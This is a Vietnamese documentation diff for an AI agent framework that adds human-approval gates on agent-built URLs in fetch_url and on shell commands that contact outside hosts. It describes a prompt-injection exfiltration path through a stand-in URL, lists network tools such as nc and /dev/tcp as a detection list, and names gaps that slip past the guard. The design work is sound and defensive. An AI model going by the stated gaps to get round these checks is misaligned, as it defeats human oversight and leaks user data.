@@ -84,7 +84,7 @@ System prompt liệt kê tên các tool có sẵn; model thấy JSON schema củ
 | `workspace_list` | không | — | liệt kê một thư mục trong workspace |
 | `workspace_read` | không | chỉ trần đầu ra của agent (`tool_output_chars`), có đánh dấu chỗ cắt | đọc một tệp văn bản trong workspace; `offset` (dòng, tính từ 1) và `limit` đọc một cửa sổ thay vì cả tệp |
 | `workspace_write` | **có** | — | ghi một tệp văn bản trong workspace, tạo thư mục cha; chỉ dưới `write_paths` nếu profile đặt khoá này |
-| `fetch_url` | không | 20 000 ký tự qua markdown của firecrawl, nếu không thì 6 000; kết nối 5 s, mỗi lần đọc 10 s, đọc tối đa 512 KB rồi đóng; không theo redirect | GET một trang http(s) công khai; firecrawl trả về markdown, nếu không thì HTML được rút thành văn bản |
+| `fetch_url` | chỉ khi địa chỉ do agent tự ghép, xem [Tool web](#tool-web) | 20 000 ký tự qua markdown của firecrawl, nếu không thì 6 000; trang dài hơn trần đầu ra của agent thì đọc từng đoạn bằng `offset`; kết nối 5 s, mỗi lần đọc 10 s, đọc tối đa 512 KB rồi đóng; không theo redirect | GET một trang http(s) công khai; firecrawl trả về markdown, nếu không thì HTML được rút thành văn bản; nội dung trang nằm trong hàng rào dữ liệu như trang của trình duyệt |
 | `web_search` | không | 5 kết quả | luôn có sẵn; các backend được thử theo thứ tự firecrawl → brave → tavily → duckduckgo → openrouter; trả về tiêu đề, URL, đoạn trích |
 | `memory_save` | không | — | nối `- HH:MM text` vào ghi chú hôm nay, xem [memory.md](memory.md) |
 | `memory_search` | không | 12 kết quả | tìm trong facts người dùng dùng chung, rồi `MEMORY.md` và mọi ghi chú ngày, mới nhất trước; mọi từ khoá đều phải khớp |
@@ -296,6 +296,33 @@ Tool không trả kết quả rỗng. Máy chủ trả 202 (đã nhận, chưa c
 dựng bằng JavaScript) cũng là lỗi nói đúng điều đó: một chuỗi rỗng model đọc thành "trang không
 nói gì" và kể lại như một dữ kiện. `shell_run` cũng vậy: lệnh xong mà không in gì trả về một ghi
 chú nói thế, lệnh hỏng mà không in gì vẫn có dòng mã thoát.
+
+**Địa chỉ cũng là một lời nhắn.** `fetch_url` không đổi gì, nhưng một agent bị trang nó vừa
+đọc xui mở `https://nơi-khác.example/?q=<điều nó biết>` thì đã gửi điều nó biết đi. Nên lời gọi
+dừng lại hỏi người khi địa chỉ là thứ **agent tự ghép**, kể cả trong cuộc trò chuyện autonomous và
+kể cả khi người dùng đã chọn "luôn cho phép" tool này. Một địa chỉ không bị hỏi khi rơi vào một
+trong hai trường hợp:
+
+- nó có **nguyên văn** trong thứ cuộc trò chuyện nhận từ bên ngoài model: tin nhắn của người (cả
+  prompt của job lịch), và kết quả của `web_search`, `fetch_url`, các tool `browser_*`. Phần
+  `#…` và dấu `/` cuối không tính, vì chúng không nói thêm gì với máy chủ. Kết quả của
+  `shell_run`, tệp trong workspace và tool MCP **không** tính: agent quyết định những thứ đó nói
+  gì, nên địa chỉ dội qua đó vẫn là của nó. Cuộc được `delegate` giao thì lời giao việc là do một
+  model viết nên không tính; thứ cuộc trò chuyện phía trên nó nhận từ bên ngoài thì tính (đọc
+  ngược lên tối đa 5 tầng);
+- host của nó nằm trong `outbound_hosts` của agent (`api.example` là đúng host đó,
+  `*.api.example` là nó và mọi host bên dưới), xem [Shell](#shell).
+
+Mọi lời gọi khác chạy không hỏi như trước, ở cuộc được giám sát cũng như cuộc autonomous. Hệ quả
+của việc tool có thể phải hỏi: script `read_only` của `tool_script` không gọi được `fetch_url`
+(script `gated` thì gọi được, qua cổng duyệt), và lượt bị server khởi động lại cắt giữa một lần
+`fetch_url` thì đóng lời gọi bằng một ghi chú thay vì tự tải lại. Job lịch chạy script (không có
+cuộc trò chuyện nào) chỉ tải được host trong `outbound_hosts`.
+
+Những gì trang trả về là dữ liệu, không phải chỉ dẫn: nội dung, và cả nơi một redirect trỏ tới,
+đứng giữa hai dòng rào `<<<TRANG …` như trang của tool trình duyệt. Trang dài hơn chỗ còn lại
+dưới `tool_output_chars` được trả từng đoạn, kèm một dòng ngoài rào nói đoạn này từ ký tự nào đến
+ký tự nào và dặn gọi lại với `offset` để đọc tiếp.
 
 `web_search` thử các backend theo thứ tự và dừng ở cái đầu tiên có kết quả:
 firecrawl, rồi Brave, rồi Tavily, rồi DuckDuckGo. DuckDuckGo không cần khoá và đóng
@@ -857,6 +884,38 @@ Khác với macOS ở mấy chỗ:
 - Bảng tiến trình vẫn là của host như dưới `sandbox-exec`: container che một phần `/proc` (Docker
   làm vậy) thì không cho mount `/proc` mới cho một PID namespace riêng.
 
+**Lệnh gửi ra ngoài.** Agent autonomous chạy lệnh không ai trông, và một lệnh nói chuyện với
+máy chủ khác thì mang đi được mọi thứ agent đã đọc. Nên lệnh chạy một chương trình mạng dừng lại
+hỏi người, trừ khi mọi host nó nêu đều nằm trong `outbound_hosts` của agent. Câu hỏi này đứng
+cùng chỗ với danh sách hỏi: trên autonomy, trên `shell_allow_patterns` và trên "luôn cho phép".
+Lệnh được đọc theo từng lệnh đơn (tách ở `;`, `&&`, `|`, `$(…)`, dấu huyền, xuống dòng), bỏ qua
+phép gán biến và các từ chỉ để chạy lệnh khác (`sudo`, `env`, `xargs`…), và `sh -c '…'` được đọc
+vào trong:
+
+| Chương trình | Host đọc từ đâu |
+|---|---|
+| `curl`, `wget`, `http`, `https`, `xh`, `aria2c` | mọi `scheme://host` trong lệnh; không có cái nào (địa chỉ nằm trong biến, hoặc viết thiếu `https://`) thì hỏi với lý do "không đọc được máy chủ đích" |
+| `ssh`, `scp`, `sftp`, `telnet`, `ftp`, `nc`, `ncat`, `netcat` | `user@host`, `host:đường-dẫn`, nếu không thì từ đầu tiên không phải tuỳ chọn |
+| `gh` | luôn là `github.com` |
+| `rsync` | chỉ khi có `user@host`, `host:đường-dẫn` hoặc URL; chép trong máy thì không hỏi |
+| `git … push` | URL hoặc `user@host:…` trong lệnh; `git push origin` không nêu host nên hỏi |
+| `python*`, `node`, `ruby`, `perl`, `php`, `deno`, `bun`, `bunx`, `npx`, `uv`, `uvx`, `pipx`, `git`, `openssl`, `socat`, `osascript`, `pwsh` | chỉ khi cả lệnh có viết một URL (ví dụ code truyền qua `-c` hay heredoc); `python3 scripts/report.py` không hỏi |
+| bất kỳ lệnh nào có `/dev/tcp/host/…` hay `/dev/udp/host/…` | host đó |
+
+`localhost`, `127.*`, `::1` và `0.0.0.0` không tính là ra ngoài, và `file://` không phải địa chỉ
+mạng. Yêu cầu duyệt nêu host đầu tiên nằm ngoài danh sách (chỉ host, không kèm đường dẫn hay
+tham số, vì đó là nơi khoá hay nằm). Agent có `shell_network: false` không bị đọc: sandbox đã
+giữ điều mà rào này chỉ hỏi.
+
+`outbound_hosts` mặc định rỗng và dùng chung cho rào này và cho `fetch_url` (xem
+[Tool web](#tool-web)). Đặt trong `config.yaml`, theo từng agent trong `agent.yaml` (thay cho
+danh sách toàn cục), hoặc qua `MY_AGENT_OUTBOUND_HOSTS` (phân cách bằng dấu phẩy).
+
+Đây cũng là rào mềm: nó đọc chữ của một lệnh. Script được viết ở lời gọi này và chạy ở lời gọi
+sau thì không nêu địa chỉ nào ở đây, một chương trình không có trong bảng (CLI riêng như `gws`)
+không bị đọc, và host ghép từ biến trong code thì không thấy được. Thứ giữ được những đường đó
+là sandbox.
+
 `shell_allow_patterns` là hình ảnh phản chiếu, và mặc định rỗng. Nó nêu các
 dạng lệnh đủ thường ngày để chạy không hỏi *ngay cả khi cuộc trò chuyện không
 autonomous*, chính là thứ cho phép agent được giám sát chạy test của mình hay đọc git
@@ -1303,9 +1362,9 @@ print(len(pages), "trang,", len(late), "quá hạn:", ", ".join(late))
   ai, trong số tool agent đang giữ; agent bật `script_calls: gated` có thêm các tool có ghi, xem
   bullet "Script gọi cả tool ghi":
   - tool có sẵn tự khai là gọi lại được sau restart: `workspace_read`, `workspace_list`,
-    `workspace_grep`, `workspace_glob`, `fetch_url`, `web_search`, `memory_search`,
+    `workspace_grep`, `workspace_glob`, `web_search`, `memory_search`,
     `conversation_search`, `wiki_get`, `wiki_search`, `artifact_list`, `skill_read`, `pdf_read`,
-    `image_read`, `tool_output_read`. Năm tool cũng chỉ đọc nhưng không gọi được từ script là
+    `image_read`, `tool_output_read`. `fetch_url` không nằm trong số này vì nó có thể phải hỏi người (địa chỉ do agent tự ghép, xem [Tool web](#tool-web)). Năm tool cũng chỉ đọc nhưng không gọi được từ script là
     `progress_note`, `delegate`, `tool_search`, chính `tool_script` và `artifact_read`. Bốn tool
     đầu nói thay agent hoặc làm việc qua cuộc trò chuyện, thứ mà lời gọi của script không thuộc
     về. `artifact_read` thì để lại dấu trên cuộc trò chuyện: đọc một canvas đến hết là điều cho
